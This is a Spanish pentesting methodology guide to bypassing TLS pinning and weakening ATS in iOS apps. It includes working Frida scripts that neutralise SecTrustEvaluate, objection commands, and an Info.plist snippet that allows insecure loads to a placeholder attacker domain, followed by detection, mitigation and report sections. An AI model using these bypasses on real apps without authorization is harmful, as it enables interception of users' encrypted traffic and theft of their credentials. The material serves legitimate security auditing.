# TLS Pinning Bypass y ATS

## Resumen

**Qué es:**

- **TLS Pinning** es una técnica que asegura que la app solo acepta conexiones si el certificado TLS remoto coincide con uno específico embebido o predefinido.
- **ATS (App Transport Security)** es la política de seguridad de iOS que obliga al uso de HTTPS fuerte y restringe conexiones a endpoints inseguros.

**Por qué importa:** Saltarse TLS pinning permite interceptar, modificar o espiar tráfico de apps iOS, incluso si usan HTTPS. Manipular ATS posibilita conexiones inseguras y ataques man-in-the-middle.
**Cuándo aplicarlo:** Cuando es necesario pentestear APIs, interceptar tráfico cifrado o auditar apps de iOS que implementan control estricto de certificados.

---

## Contexto

**Supuestos:**

- Dispositivo iOS con jailbreak o simulador (para bypass dinámico).
- Acceso a app objetivo, tráfico y posibilidad de inyectar código con Frida/Lldb/objection.
- Objetivo: analizar tráfico HTTPS/API, modificar requests o hacer replay/test masivos.
- Herramientas: Frida, objection, Burp Suite, mitmproxy, Charles Proxy, Hopper/IDA para análisis estático.

**Límites:**

- Pinning robusto fuera de app (en hardware/Secure Enclave) NO es explotable aquí.
- Foco en apps convencionales iOS; no cubre networking nativo en C puro.

---

## Metodología

### 1. Reconocimiento

- Analizar el uso de UIApplication, NSURLSession, Alamofire, OkHttp o librerías custom de networking.
- Revisar Info.plist para políticas ATS y excepción a dominios.
- Buscar métodos de validación de certificados y delegados (NSURLSessionDelegate, SecTrust*).

### 2. Bypass de Pinning Dinámico (Frida/objection)

- **Hook de métodos de validación Objective-C:**
  - NSURLSessionDelegate: `URLSession:didReceiveChallenge:completionHandler`
  - NSURLConnectionDelegate: `connection:willSendRequestForAuthenticationChallenge:`
  - SecTrustEvaluate, SecTrustEvaluateWithError
- **Bypass genéricos con scripts:**

```javascript
// Pinning Bypass con Frida
var resolver = new ApiResolver('objc');
resolver.enumerateMatches('*NSURLSession*', {
  onMatch: function(match){
    Interceptor.attach(match.address, {
      onEnter: function(args){ console.log('Hooked NSURLSession method: ', match.name); }
    });
  },
  onComplete: function(){}
});

var SecTrustEvaluate = Module.findExportByName("Security", "SecTrustEvaluate");
if (SecTrustEvaluate) {
  Interceptor.replace(SecTrustEvaluate, new NativeCallback(function(trust, result) {
      console.log("[+] Bypassing SecTrustEvaluate");
      Memory.writeU8(result, 1);
      return 0;
  }, 'int', ['pointer', 'pointer']));
}
```

- **Objection CLI:**

```bash
objection -g 'com.example.app' explore
ios sslpinning disable
```

### 3. Manipulación de ATS

- Revisar y modificar `Info.plist`:

```xml
<key>NSAppTransportSecurity</key>
<dict>
  <key>NSAllowsArbitraryLoads</key>
  <true/>
  <key>NSExceptionDomains</key>
  <dict>
    <key>api.atacante.com</key>
    <dict>
      <key>NSExceptionAllowsInsecureHTTPLoads</key>
      <true/>
    </dict>
  </dict>
</dict>
```

- Usar runtime hooks para engañar comprobaciones de ATS si no está permitido el cambio en build.

### 4. Análisis Estático

- Buscar código de comparación binaria de certificados, hashes SHA256, pins hardcodeados.
- Inspeccionar si hay configuración ATS restrictiva (rechazo de HTTP, fuerza de TLS ≥ 1.2).

---

## Pruebas Manuales

**1. Interceptar tráfico con proxy y verificar bloqueo**

- Configurar Burp/mitmproxy y ver si la app arroja error de conexión o certificado no confiable.

**2. Usar Frida/objection (según arriba) para saltar validación**

- Confirmar que ahora Burp/mitmproxy captura el tráfico original en claro.

**3. Modificación/abuso de ATS**

- Cambiar Info.plist o hacerlo al vuelo con Frida/objection y reiniciar la app.

**4. Simular ataques MITM**

- Modificar respuestas/cabeceras y constatar si la app lo acepta/bloquea.

---

## PoC Automatizada

**Script Frida:**

```javascript
// Frida SSL Pinning universal bypass para iOS
// Fuente: https://codeshare.frida.re/@akabe1/ios-ssl-pinning-bypass/
if (ObjC.available) {
  var SSLPinningClass = [
    "NSURLSession", "NSURLConnection", "NSURL", 
    "NSURLSessionDataDelegate", "NSURLSessionDelegate"
  ];
  SSLPinningClass.forEach(function(cls) {
    if (ObjC.classes.hasOwnProperty(cls)) {
      var methods = ObjC.classes[cls].$ownMethods;
      methods.forEach(function(method) {
        if (method.indexOf("challenge") > -1 || method.indexOf("authenticat") > -1) {
          var impl = ObjC.classes[cls][method];
          if (impl.implementation) {
            Interceptor.attach(impl.implementation, {
              onEnter: function(){},
              onLeave: function(){ 
                console.log("[+] Bypassed: " + cls + "::" + method); 
              }
            });
          }
        }
      });
    }
  });

  var SecTrustEvaluate = Module.findExportByName("Security", "SecTrustEvaluate");
  if (SecTrustEvaluate) {
    Interceptor.replace(SecTrustEvaluate, new NativeCallback(function(trust, result) {
        Memory.writeU8(result, 1); return 0;
    }, 'int', ['pointer', 'pointer']));
  }
}
```

---

## Explotación y Automatización

- Automatizar la suppressión de TLS pinning en CI/CD para pentesting masivo.
- Usar herramientas tipo Frida-ios-dump o ssl-kill-switch2 para apps protegidas.
- Fuzzing sobre tráfico interceptado para análisis de API/fuzz de parámetros.

---

## Impacto

- **Interceptación y manipulación total del tráfico HTTPS:** Permite credencial stuffing, session hijacking, data exfiltration.
- **Bypass de controles de integridad y antifraude:** Las apps confían en el canal sin validación real server-side.
- **Abuso de endpoints y APIs sensibles:** Permite crear, modificar o eliminar datos de usuario atacando la integración móvil-backend.

**Mapeo OWASP:** M3 Insecure Communication, M7 Client Code Quality, M10 Extraneous Functionality.

---

## Detección

- Monitoreo de tráfico inusual HTTP/HTTPS en dispositivos.
- Detección de herramientas de hook (Frida, objection).
- Alertas de cambio en la política ATS en Info.plist.
- Análisis de logs por fallos frecuentes en la validación TLS.

---

## Mitigación

- Pinning múltiple (backup pins) y verificación server-side.
- Validación estricta y alerta ante cambios de Info.plist.
- Anti-hook y detección activa de instrumentación.
- Eventos críticos fuera de canal móvil (doble verificación server).
- Pruebas automáticas de pinning en cada build.

---

## Errores Comunes

- Implementar pinning solo en client-side sin enforcement server.
- Políticas ATS laxa ("NSAllowsArbitraryLoads: true" innecesario).
- Assumir que iOS garantiza la seguridad de la comunicación por defecto.
- No tener fallback/alerta si hay fallo de pinning.

---

## Reporte

**Título:** Bypass de TLS Pinning y manipulación de ATS permite interceptar y modificar tráfico cifrado de la app
**Impacto:** Compromiso de la comunicación, robo de datos, manipulación de API y fraude
**Pasos:**

1. Intentar hook/interceptar tráfico, aplicar bypass con Frida/objection
2. Modificar ATS en Info.plist o runtime
3. Demostrar interceptación, manipulación de requests y fallos de seguridad
   **Mitigación:** Pinning server-side, ATS cerrado, anti-hook y alertas de configuración
